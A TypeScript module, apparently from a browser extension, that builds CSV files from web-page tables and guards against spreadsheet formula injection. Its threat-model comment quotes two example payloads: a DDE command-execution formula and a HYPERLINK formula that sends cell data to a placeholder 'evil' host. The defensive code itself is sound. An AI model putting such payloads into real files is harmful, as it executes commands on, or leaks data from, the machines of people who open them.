// 🔴 REAL LOGIC (not a stub). CSV-injection guard + RFC-4180 escaping + BOM.
//
// This is small, security-critical, and platform-independent, so it is
// implemented for real in the scaffold (the brief explicitly permits it). The
// only thing still mocked around it is the DOM extraction that produces the cell
// strings (utils/table-extract.ts) — this module operates on strings and is fully
// exercised by the preview's "raw bytes" tab against the mock table.
//
// Threat model (design §8.3): cell values come from an ARBITRARY web page, i.e.
// untrusted input. A cell beginning with `= + - @` (or TAB/CR) is interpreted as
// a FORMULA by Excel/LibreOffice/Sheets, so `=cmd|'/c calc'!A0` or
// `=HYPERLINK("http://evil/?"&A1)` executes / exfiltrates on open.

import type { CsvDelimiter, CsvEol, FormulaGuard } from './types';

/** Characters that make a leading cell dangerous in a spreadsheet. */
const DANGEROUS_LEADERS = new Set(['=', '+', '-', '@', '\t', '\r']);

/**
 * True when `raw` is unambiguously a NUMBER (optionally signed, spaces/NBSP as
 * thousands separators, `,`/`.` decimal, U+2212 minus). Such a cell is NOT a
 * formula risk and must NOT be escaped — otherwise every negative rate in a table
 * becomes `'-5`, the single most common bug in other implementations (design §8.3).
 */
export function isPlainNumber(raw: string): boolean {
  const s = raw
    .trim()
    .replace(/[\u00A0\u202F\u2009]/g, '') // NBSP / narrow NBSP / thin space
    .replace(/\u2212/g, '-') // real minus → hyphen
    .replace(/(?<=\d)[ ](?=\d)/g, ''); // ASCII thousands space between digits
  if (s === '') return false;
  // Accept 1 234,56 / -3.14 / +1000 forms with a single decimal separator.
  return /^[+-]?\d+(?:[.,]\d+)?$/.test(s);
}

/** Does this cell trigger the formula guard? (leading dangerous char, not a number) */
export function isFormulaRisk(raw: string): boolean {
  const t = raw.trimStart();
  if (t === '') return false;
  if (!DANGEROUS_LEADERS.has(t[0]!)) return false;
  return !isPlainNumber(raw);
}

/**
 * Apply the guard to a single value (before RFC-4180 quoting). `escape` prefixes
 * an apostrophe (Excel shows it as text; the `'` lives in the formula bar, not the
 * cell). `keep`/`warn` leave data untouched (the UI gates those separately).
 */
export function guardValue(raw: string, mode: FormulaGuard): string {
  if (mode === 'escape' && isFormulaRisk(raw)) return `'${raw}`;
  return raw;
}

/** RFC-4180 field quoting: wrap in double quotes when it contains the delimiter,
 *  a quote, CR or LF; double any embedded quote. */
export function escapeField(value: string, delimiter: string): boolean {
  return (
    value.includes(delimiter) ||
    value.includes('"') ||
    value.includes('\n') ||
    value.includes('\r')
  );
}

function encodeField(value: string, delimiter: string): string {
  if (escapeField(value, delimiter)) return `"${value.replace(/"/g, '""')}"`;
  return value;
}

/** Resolve the 'auto' delimiter to a concrete char by page/browser locale
 *  (`;` for ru/de-style list separators, else `,`). Design §3. */
export function resolveDelimiter(delimiter: CsvDelimiter, locale: string): string {
  if (delimiter !== 'auto') return delimiter;
  const semicolonLocales = /^(ru|de|fr|es|it|pl|cs|nl|pt|tr|uk)/i;
  return semicolonLocales.test(locale) ? ';' : ',';
}

export const BOM = '﻿';

export interface CsvOptions {
  delimiter: CsvDelimiter;
  encoding: 'utf8-bom' | 'utf8';
  eol: CsvEol;
  formulaGuard: FormulaGuard;
  sepLine: boolean;
  locale: string;
}

/**
 * Build the exact CSV text (what the "raw bytes" preview tab shows and what the
 * file will contain). REAL: guard → RFC-4180 quote → join with the chosen EOL →
 * optional `sep=` line → optional BOM. Rows arrive already extracted (the
 * extraction itself is the mocked part).
 */
export function buildCsv(rows: string[][], opts: CsvOptions): string {
  const delim = resolveDelimiter(opts.delimiter, opts.locale);
  const eol = opts.eol === 'crlf' ? '\r\n' : '\n';

  const lines = rows.map((row) =>
    row
      .map((cell) => encodeField(guardValue(cell, opts.formulaGuard), delim))
      .join(delim),
  );

  const parts: string[] = [];
  if (opts.encoding === 'utf8-bom') parts.push(BOM);
  // ⚠️ `sep=;` helps Excel but breaks pandas/Sheets (design §2.3) — opt-in only.
  if (opts.sepLine) parts.push(`sep=${delim}${eol}`);
  parts.push(lines.join(eol));
  return parts.join('');
}

/** How many cells the guard would escape — the exact count the preview shows. */
export function countGuarded(rows: string[][]): number {
  let n = 0;
  for (const row of rows) for (const cell of row) if (isFormulaRisk(cell)) n++;
  return n;
}
